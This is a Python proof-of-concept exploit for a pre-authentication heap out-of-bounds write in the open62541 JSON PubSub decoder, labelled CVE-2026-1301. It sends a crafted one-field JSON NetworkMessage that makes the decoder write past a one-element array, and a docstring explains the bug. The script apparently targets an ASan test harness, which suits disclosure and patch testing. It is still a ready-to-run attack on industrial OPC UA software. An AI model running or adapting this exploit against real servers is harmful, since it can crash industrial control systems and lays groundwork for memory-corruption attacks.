#!/usr/bin/env python3
"""
PoC for CVE-2026-1301 - open62541 JSON PubSub decoder heap OOB write (pre-auth).

The vulnerable v1.5.0-rc2 JSON PubSub decoder (DataSetPayload_decodeJsonInternal)
sizes the keyFrameFields array to the number of key/value pairs in the *payload*,
then writes keyFrameFields[index] where `index` comes from resolving the payload
field NAME against the receiver's configured field metadata -- with no bound check.

The receiver in this harness is configured with 8 metadata fields, "Energy" at
index 7. We send a JSON PubSub NetworkMessage whose Payload contains exactly ONE
field ("Energy"): length=1 -> keyFrameFields allocated with 1 entry, but "Energy"
resolves to metadata index 7 -> keyFrameFields[7] is written OUT OF BOUNDS.

ASan -> heap-buffer-overflow WRITE in UA_DataValue_clear (called from
DataSetPayload_decodeJsonInternal) -> SIGABRT. Check `docker logs`.

Wire format: the raw JSON NetworkMessage bytes; the server reads to EOF then decodes.
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4840

# JSON ua-data NetworkMessage. DataSetWriterId 1 matches the receiver's configured
# metadata. Payload has ONE field whose name ("Energy") maps to metadata index 7.
PAYLOAD_JSON = (
    '{'
    '"MessageType":"ua-data",'
    '"Messages":[{'
    '"DataSetWriterId":1,'
    '"Payload":{"Energy":null}'
    '}]'
    '}'
)


def main():
    print(f"[*] CVE-2026-1301 PoC -> {HOST}:{PORT}")
    print('[*] sending JSON PubSub NetworkMessage, Payload {"Energy":null}')
    print("[*]   payload length = 1 field; metadata maps Energy -> index 7")
    print("[*]   -> keyFrameFields[7] written into a 1-element allocation (OOB)")
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(PAYLOAD_JSON.encode())
    s.shutdown(socket.SHUT_WR)  # signal EOF so the server decodes the full message
    s.settimeout(5)
    try:
        data = s.recv(256)
        print(f"[*] server replied {len(data)} bytes (no crash -> patched/benign)")
    except (socket.timeout, ConnectionResetError) as e:
        print(f"[+] Connection dropped/timeout ({e})")
        print("[+] Server likely aborted (ASan heap-buffer-overflow WRITE on "
              "keyFrameFields[index]) -> check docker logs")
    s.close()


if __name__ == "__main__":
    main()
